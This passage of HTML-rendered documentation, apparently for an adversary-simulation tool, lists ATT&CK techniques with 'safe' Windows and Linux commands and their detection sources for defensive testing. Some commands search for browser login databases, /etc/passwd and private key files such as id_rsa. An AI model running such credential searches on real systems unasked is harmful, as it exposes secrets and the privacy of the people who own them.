+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>~/.config/google-chrome/Default/Login<span class="se">\ </span>Data<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (existence check only)
+<strong>Detection:</strong> File Access</p>
+<hr />
+<h3 id="t1003008-etcpasswd-and-etcshadow">T1003.008 - /etc/passwd and /etc/shadow<a class="headerlink" href="#t1003008-etcpasswd-and-etcshadow" title="Permanent link">&para;</a></h3>
+<p>Reads password file information (non-sensitive parts).</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d:<span class="w"> </span>-f1,3,6,7
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Linux
+<strong>Safe:</strong> Yes (reads public passwd info only)
+<strong>Detection:</strong> Process Creation (cat), File Access</p>
+<hr />
+<h3 id="t1552004-private-keys">T1552.004 - Private Keys<a class="headerlink" href="#t1552004-private-keys" title="Permanent link">&para;</a></h3>
+<p>Searches for private key files.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="16:2"><input checked="checked" id="__tabbed_16_1" name="__tabbed_16" type="radio" /><input id="__tabbed_16_2" name="__tabbed_16" type="radio" /><div class="tabbed-labels"><label for="__tabbed_16_1">Windows</label><label for="__tabbed_16_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>dir /s /b C:\Users\*.pem C:\Users\*.key C:\Users\*.ppk 2&gt;nul
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>find<span class="w"> </span>/home<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.pem&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.key&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;id_rsa&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (file search only, no reading)
+<strong>Detection:</strong> Process Creation, File Access</p>
+<hr />
+<h2 id="discovery-9-techniques">Discovery (9 techniques)<a class="headerlink" href="#discovery-9-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1082-system-information-discovery">T1082 - System Information Discovery<a class="headerlink" href="#t1082-system-information-discovery" title="Permanent link">&para;</a></h3>
+<p>Collects information about the operating system and hardware.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="17:2"><input checked="checked" id="__tabbed_17_1" name="__tabbed_17" type="radio" /><input id="__tabbed_17_2" name="__tabbed_17" type="radio" /><div class="tabbed-labels"><label for="__tabbed_17_1">Windows</label><label for="__tabbed_17_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>systeminfo
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>uname<span class="w"> </span>-a<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/etc/os-release
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (systeminfo.exe, uname)</p>
+<hr />
+<h3 id="t1083-file-and-directory-discovery">T1083 - File and Directory Discovery<a class="headerlink" href="#t1083-file-and-directory-discovery" title="Permanent link">&para;</a></h3>
+<p>Enumerates files and directories.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="18:2"><input checked="checked" id="__tabbed_18_1" name="__tabbed_18" type="radio" /><input id="__tabbed_18_2" name="__tabbed_18" type="radio" /><div class="tabbed-labels"><label for="__tabbed_18_1">Windows</label><label for="__tabbed_18_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>dir C:\Users
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/home
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (dir.exe, ls)</p>
+<hr />
+<h3 id="t1057-process-discovery">T1057 - Process Discovery<a class="headerlink" href="#t1057-process-discovery" title="Permanent link">&para;</a></h3>
+<p>Lists running processes.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="19:2"><input checked="checked" id="__tabbed_19_1" name="__tabbed_19" type="radio" /><input id="__tabbed_19_2" name="__tabbed_19" type="radio" /><div class="tabbed-labels"><label for="__tabbed_19_1">Windows</label><label for="__tabbed_19_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>tasklist
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>ps<span class="w"> </span>aux
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (tasklist.exe, ps)</p>
+<hr />
+<h3 id="t1016-system-network-configuration-discovery">T1016 - System Network Configuration Discovery<a class="headerlink" href="#t1016-system-network-configuration-discovery" title="Permanent link">&para;</a></h3>
+<p>Gathers network configuration information.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="20:2"><input checked="checked" id="__tabbed_20_1" name="__tabbed_20" type="radio" /><input id="__tabbed_20_2" name="__tabbed_20" type="radio" /><div class="tabbed-labels"><label for="__tabbed_20_1">Windows</label><label for="__tabbed_20_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>ipconfig /all
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>ip<span class="w"> </span>addr<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/etc/resolv.conf
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (ipconfig.exe, ip)</p>
+<hr />
+<h3 id="t1049-system-network-connections-discovery">T1049 - System Network Connections Discovery<a class="headerlink" href="#t1049-system-network-connections-discovery" title="Permanent link">&para;</a></h3>
+<p>Lists active network connections.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="21:2"><input checked="checked" id="__tabbed_21_1" name="__tabbed_21" type="radio" /><input id="__tabbed_21_2" name="__tabbed_21" type="radio" /><div class="tabbed-labels"><label for="__tabbed_21_1">Windows</label><label for="__tabbed_21_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>netstat -ano
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>netstat<span class="w"> </span>-tunap<span class="w"> </span><span class="o">||</span><span class="w"> </span>ss<span class="w"> </span>-tunap
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (netstat.exe, ss)</p>
+<hr />
+<h3 id="t1087-account-discovery">T1087 - Account Discovery<a class="headerlink" href="#t1087-account-discovery" title="Permanent link">&para;</a></h3>
+<p>Enumerates user accounts.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="22:2"><input checked="checked" id="__tabbed_22_1" name="__tabbed_22" type="radio" /><input id="__tabbed_22_2" name="__tabbed_22" type="radio" /><div class="tabbed-labels"><label for="__tabbed_22_1">Windows</label><label for="__tabbed_22_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>net user
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d:<span class="w"> </span>-f1
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (net.exe, cat)</p>
+<hr />
+<h3 id="t1069-permission-groups-discovery">T1069 - Permission Groups Discovery<a class="headerlink" href="#t1069-permission-groups-discovery" title="Permanent link">&para;</a></h3>
+<p>Enumerates permission groups.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="23:2"><input checked="checked" id="__tabbed_23_1" name="__tabbed_23" type="radio" /><input id="__tabbed_23_2" name="__tabbed_23" type="radio" /><div class="tabbed-labels"><label for="__tabbed_23_1">Windows</label><label for="__tabbed_23_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>net localgroup
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>cat<span class="w"> </span>/etc/group
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (net.exe, cat)</p>
+<hr />
+<h3 id="t1018-remote-system-discovery">T1018 - Remote System Discovery<a class="headerlink" href="#t1018-remote-system-discovery" title="Permanent link">&para;</a></h3>
+<p>Discovers remote systems on the network.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="24:2"><input checked="checked" id="__tabbed_24_1" name="__tabbed_24" type="radio" /><input id="__tabbed_24_2" name="__tabbed_24" type="radio" /><div class="tabbed-labels"><label for="__tabbed_24_1">Windows</label><label for="__tabbed_24_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>net view
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>arp<span class="w"> </span>-a
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (net.exe, arp)</p>
+<hr />
+<h3 id="t1007-system-service-discovery">T1007 - System Service Discovery<a class="headerlink" href="#t1007-system-service-discovery" title="Permanent link">&para;</a></h3>
+<p>Lists running services.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="25:2"><input checked="checked" id="__tabbed_25_1" name="__tabbed_25" type="radio" /><input id="__tabbed_25_2" name="__tabbed_25" type="radio" /><div class="tabbed-labels"><label for="__tabbed_25_1">Windows</label><label for="__tabbed_25_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>sc query
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (sc.exe, systemctl)</p>
+<hr />
+<h2 id="lateral-movement-3-techniques">Lateral Movement (3 techniques)<a class="headerlink" href="#lateral-movement-3-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1021001-remote-desktop-protocol">T1021.001 - Remote Desktop Protocol<a class="headerlink" href="#t1021001-remote-desktop-protocol" title="Permanent link">&para;</a></h3>
+<p>Checks for RDP availability and configuration.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (read-only query)
+<strong>Detection:</strong> Process Creation (reg.exe), Registry Access</p>
+<hr />
+<h3 id="t1021002-smbwindows-admin-shares">T1021.002 - SMB/Windows Admin Shares<a class="headerlink" href="#t1021002-smbwindows-admin-shares" title="Permanent link">&para;</a></h3>
+<p>Enumerates SMB shares.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="26:2"><input checked="checked" id="__tabbed_26_1" name="__tabbed_26" type="radio" /><input id="__tabbed_26_2" name="__tabbed_26" type="radio" /><div class="tabbed-labels"><label for="__tabbed_26_1">Windows</label><label for="__tabbed_26_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>net share
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>localhost<span class="w"> </span>-N<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;SMB not available&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation, Network Connection</p>
+<hr />
+<h3 id="t1021004-ssh">T1021.004 - SSH<a class="headerlink" href="#t1021004-ssh" title="Permanent link">&para;</a></h3>
+<p>Checks for SSH availability and configuration.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="27:2"><input checked="checked" id="__tabbed_27_1" name="__tabbed_27" type="radio" /><input id="__tabbed_27_2" name="__tabbed_27" type="radio" /><div class="tabbed-labels"><label for="__tabbed_27_1">Windows</label><label for="__tabbed_27_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>sc query sshd 2&gt;nul || echo SSH service not found
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>systemctl<span class="w"> </span>status<span class="w"> </span>sshd<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span>systemctl<span class="w"> </span>status<span class="w"> </span>ssh<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (status check only)
+<strong>Detection:</strong> Process Creation, Service Query</p>
+<hr />
+<h2 id="collection-4-techniques">Collection (4 techniques)<a class="headerlink" href="#collection-4-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1005-data-from-local-system">T1005 - Data from Local System<a class="headerlink" href="#t1005-data-from-local-system" title="Permanent link">&para;</a></h3>
+<p>Enumerates files of interest on the local system.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="28:2"><input checked="checked" id="__tabbed_28_1" name="__tabbed_28" type="radio" /><input id="__tabbed_28_2" name="__tabbed_28" type="radio" /><div class="tabbed-labels"><label for="__tabbed_28_1">Windows</label><label for="__tabbed_28_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>dir /s /b C:\Users\*.docx C:\Users\*.xlsx C:\Users\*.pdf 2&gt;nul | findstr /v &quot;AppData&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>find<span class="w"> </span>/home<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.pdf&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.docx&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.xlsx&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (file listing only)
+<strong>Detection:</strong> Process Creation, File Access</p>
+<hr />
+<h3 id="t1039-data-from-network-shared-drive">T1039 - Data from Network Shared Drive<a class="headerlink" href="#t1039-data-from-network-shared-drive" title="Permanent link">&para;</a></h3>
+<p>Enumerates network shared drives.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="29:2"><input checked="checked" id="__tabbed_29_1" name="__tabbed_29" type="radio" /><input id="__tabbed_29_2" name="__tabbed_29" type="radio" /><div class="tabbed-labels"><label for="__tabbed_29_1">Windows</label><label for="__tabbed_29_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>net use
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;(cifs|nfs|smb)&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation</p>
+<hr />
+<h3 id="t1074001-local-data-staging">T1074.001 - Local Data Staging<a class="headerlink" href="#t1074001-local-data-staging" title="Permanent link">&para;</a></h3>
+<p>Checks for common staging directories.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="30:2"><input checked="checked" id="__tabbed_30_1" name="__tabbed_30" type="radio" /><input id="__tabbed_30_2" name="__tabbed_30" type="radio" /><div class="tabbed-labels"><label for="__tabbed_30_1">Windows</label><label for="__tabbed_30_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>dir %TEMP% /O-D /T:W
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>ls<span class="w"> </span>-lt<span class="w"> </span>/tmp/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (read-only)
+<strong>Detection:</strong> Process Creation, File Access</p>
+<hr />
+<h3 id="t1119-automated-collection">T1119 - Automated Collection<a class="headerlink" href="#t1119-automated-collection" title="Permanent link">&para;</a></h3>
+<p>Simulates automated file collection by listing recent files.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="31:2"><input checked="checked" id="__tabbed_31_1" name="__tabbed_31" type="radio" /><input id="__tabbed_31_2" name="__tabbed_31" type="radio" /><div class="tabbed-labels"><label for="__tabbed_31_1">Windows</label><label for="__tabbed_31_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>forfiles /P C:\Users /S /D -7 /C &quot;cmd /c echo @path @fdate&quot; 2&gt;nul | findstr /i &quot;.doc .xls .pdf&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>find<span class="w"> </span>/home<span class="w"> </span>-mtime<span class="w"> </span>-7<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.pdf&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.doc&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.xls&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (file listing only)
+<strong>Detection:</strong> Process Creation, File Access</p>
+<hr />
+<h2 id="command-and-control-3-techniques">Command and Control (3 techniques)<a class="headerlink" href="#command-and-control-3-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1071001-web-protocols">T1071.001 - Web Protocols<a class="headerlink" href="#t1071001-web-protocols" title="Permanent link">&para;</a></h3>
+<p>Tests HTTP/HTTPS connectivity to external services.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="32:2"><input checked="checked" id="__tabbed_32_1" name="__tabbed_32" type="radio" /><input id="__tabbed_32_2" name="__tabbed_32" type="radio" /><div class="tabbed-labels"><label for="__tabbed_32_1">Windows</label><label for="__tabbed_32_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="p">(</span><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;https://www.google.com&quot;</span> <span class="n">-UseBasicParsing</span> <span class="n">-TimeoutSec</span> <span class="n">5</span><span class="p">).</span><span class="n">StatusCode</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code}&quot;</span><span class="w"> </span>https://www.google.com<span class="w"> </span>--connect-timeout<span class="w"> </span><span class="m">5</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (connectivity check only)
+<strong>Detection:</strong> Network Connection, DNS Resolution</p>
+<hr />
+<h3 id="t1105-ingress-tool-transfer">T1105 - Ingress Tool Transfer<a class="headerlink" href="#t1105-ingress-tool-transfer" title="Permanent link">&para;</a></h3>
+<p>Checks download capabilities without actually downloading malicious content.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="33:2"><input checked="checked" id="__tabbed_33_1" name="__tabbed_33" type="radio" /><input id="__tabbed_33_2" name="__tabbed_33" type="radio" /><div class="tabbed-labels"><label for="__tabbed_33_1">Windows</label><label for="__tabbed_33_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span><span class="p">;</span> <span class="nb">Write-Output</span> <span class="s2">&quot;Download capabilities available&quot;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>which<span class="w"> </span>wget<span class="w"> </span>curl<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Download tools available&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (capability check only)
+<strong>Detection:</strong> Process Creation</p>
+<hr />
+<h3 id="t1572-protocol-tunneling">T1572 - Protocol Tunneling<a class="headerlink" href="#t1572-protocol-tunneling" title="Permanent link">&para;</a></h3>
+<p>Checks for tunneling tools availability.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="34:2"><input checked="checked" id="__tabbed_34_1" name="__tabbed_34" type="radio" /><input id="__tabbed_34_2" name="__tabbed_34" type="radio" /><div class="tabbed-labels"><label for="__tabbed_34_1">Windows</label><label for="__tabbed_34_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>netsh interface portproxy show all
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>which<span class="w"> </span>ssh<span class="w"> </span>socat<span class="w"> </span>ncat<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;:(1080|8080|3128)&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation, Network Connection</p>
+<hr />
+<h2 id="exfiltration-3-techniques">Exfiltration (3 techniques)<a class="headerlink" href="#exfiltration-3-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1048003-exfiltration-over-unencrypted-non-c2-protocol">T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol<a class="headerlink" href="#t1048003-exfiltration-over-unencrypted-non-c2-protocol" title="Permanent link">&para;</a></h3>
+<p>Checks for common exfiltration channels (DNS, HTTP).</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="35:2"><input checked="checked" id="__tabbed_35_1" name="__tabbed_35" type="radio" /><input id="__tabbed_35_2" name="__tabbed_35" type="radio" /><div class="tabbed-labels"><label for="__tabbed_35_1">Windows</label><label for="__tabbed_35_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>nslookup test.example.com 2&gt;nul &amp;&amp; echo &quot;DNS resolution available&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
